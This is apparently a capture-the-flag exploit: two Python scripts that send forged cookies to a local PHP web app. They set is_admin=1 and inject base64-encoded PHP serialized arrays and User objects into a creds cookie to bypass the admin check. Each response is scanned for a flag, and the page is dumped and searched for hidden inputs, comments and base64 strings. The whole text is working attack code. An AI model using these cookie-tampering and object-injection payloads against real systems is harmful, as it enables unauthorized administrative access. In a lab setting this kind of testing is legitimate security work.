import requests
import base64
import re

base_url = "http://127.0.0.1:32921/"

print("[*] Testing with only is_admin cookie (no creds)...\n")
headers = {'Cookie': 'is_admin=1'}
resp = requests.get(base_url, headers=headers)
print(f"Status: {resp.status_code}")
print(f"Length: {len(resp.content)}B")
content_match = re.search(r'</form>(.*?)</body>', resp.text, re.DOTALL)
if content_match:
    print(f"Content: {content_match.group(1).strip()[:500]}")

print("\n" + "="*80 + "\n")

# Test various serialized arrays with different fields
print("[*] Testing arrays with various admin-related fields...\n")

test_payloads = [
    # Standard array with different fields
    ('array_with_role', 'a:3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:4:"role";s:5:"admin";}'),
    ('array_with_isAdmin', 'a:3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:7:"isAdmin";b:1;}'),
    ('array_with_is_admin', 'a:3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:8:"is_admin";b:1;}'),
    ('array_with_admin', 'a:3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:5:"admin";b:1;}'),
    ('array_with_loggedIn', 'a:3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:8:"loggedIn";b:1;}'),
    ('array_with_admin_id', 'a:3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:9:"admin_id";i:1;}'),
    ('array_with_id', 'a:3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:2:"id";i:1;}'),
    ('array_with_access', 'a:3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:6:"access";s:5:"admin";}'),
    ('array_with_level', 'a:3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:5:"level";i:10;}'),
]

for name, payload in test_payloads:
    payload_b64 = base64.b64encode(payload.encode()).decode()
    headers = {'Cookie': f'creds={payload_b64}; is_admin=1'}
    resp = requests.get(base_url, headers=headers)
    
    has_rejection = "you are not the admin" in resp.text
    has_flag = "FLAG" in resp.text or "flag{" in resp.text.lower()
    
    status = "[REJECTED]" if has_rejection else "[BYPASSED!]"
    if has_flag:
        status = "[FLAG FOUND!]"
    
    print(f"    {name}: {len(resp.content)}B {status}")
    
    if has_flag:
        flag_match = re.search(r'(FLAG\{[^}]+\})', resp.text, re.IGNORECASE)
        if flag_match:
            print(f"        FLAG: {flag_match.group(1)}")

print("\n" + "="*80 + "\n")

# Test User class with proper format
print("[*] Testing User class object injection...\n")

user_payloads = [
    ('User_simple', 'O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}'),
    ('User_with_role', 'O:4:"User":3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:4:"role";s:5:"admin";}'),
    ('User_with_isAdmin', 'O:4:"User":3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:7:"isAdmin";b:1;}'),
]

for name, payload in user_payloads:
    payload_b64 = base64.b64encode(payload.encode()).decode()
    headers = {'Cookie': f'creds={payload_b64}; is_admin=1'}
    resp = requests.get(base_url, headers=headers)
    
    has_error = "Fatal error" in resp.text or "Warning" in resp.text
    has_incomplete = "__PHP_Incomplete_Class" in resp.text
    has_rejection = "you are not the admin" in resp.text
    
    print(f"    {name}: {len(resp.content)}B")
    if has_error:
        err_match = re.search(r'(Fatal error.*?|Warning.*?)(?:<|$)', resp.text)
        if err_match:
            print(f"        Error: {err_match.group(1)[:100]}")
    if has_incomplete:
        print(f"        Class not loaded: __PHP_Incomplete_Class")
    if has_rejection:
        print(f"        Status: REJECTED")
    else:
        print(f"        Status: BYPASSED!")

import requests
import base64
import re

base_url = "http://127.0.0.1:32921/"

print("[*] Full response for User class injection...\n")

payload = 'O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}'
payload_b64 = base64.b64encode(payload.encode()).decode()

headers = {'Cookie': f'creds={payload_b64}; is_admin=1'}
resp = requests.get(base_url, headers=headers)

print(f"Payload: {payload}")
print(f"Status: {resp.status_code}")
print(f"Length: {len(resp.content)}B")
print(f"\n[+] FULL RESPONSE:\n")
print(resp.text)

print("\n" + "="*80 + "\n")

# Search for any interesting patterns
print("[*] Searching for interesting patterns...")

# Check for any base64 strings
b64_matches = re.findall(r'[A-Za-z0-9+/]{30,}={0,2}', resp.text)
if b64_matches:
    print(f"\n[+] Found {len(b64_matches)} potential base64 strings")
    for b64 in b64_matches[:3]:
        try:
            decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
            if decoded and len(decoded) > 5:
                print(f"    {b64[:40]}... -> {decoded[:50]}")
        except:
            pass

# Check for HTML comments
comments = re.findall(r'<!--(.*?)-->', resp.text, re.DOTALL)
if comments:
    print(f"\n[+] HTML Comments:")
    for c in comments:
        print(f"    {c.strip()[:200]}")

# Check for hidden input fields
hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', resp.text, re.IGNORECASE)
if hidden_inputs:
    print(f"\n[+] Hidden inputs:")
    for inp in hidden_inputs:
        print(f"    {inp}")

# Check for any flag-related content
if "flag" in resp.text.lower():
    print("\n[!!!] 'flag' found in response!")
    # Get context around the word
    flag_context = re.search(r'.{50}flag.{50}', resp.text, re.IGNORECASE)
    if flag_context:
        print(f"    Context: ...{flag_context.group(0)}...")

